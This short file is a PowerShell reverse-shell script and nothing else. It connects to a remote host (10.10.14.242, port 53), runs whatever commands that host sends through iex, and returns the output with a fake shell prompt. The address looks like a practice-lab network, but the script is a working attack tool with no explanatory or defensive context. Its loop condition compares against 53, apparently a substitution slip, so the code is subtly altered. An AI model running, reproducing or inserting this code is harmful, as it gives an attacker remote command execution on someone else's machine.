
$client=New-Object System.Net.Sockets.TCPClient("10.10.14.242",53);
$stream=$client.GetStream();
[byte[]]$bytes=0..65535|%{0};
while(($i=$stream.Read($bytes,0,$bytes.Length)) -ne 53){
    $data=(New-Object System.Text.ASCIIEncoding).GetString($bytes,0,$i);
    $sendback=(iex $data 2>&1 | Out-String);
    $sendback2=$sendback+"PS "+(pwd).Path+"> ";
    $sendbyte=([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte,0,$sendbyte.Length);
    $stream.Flush()
};
$client.Close()
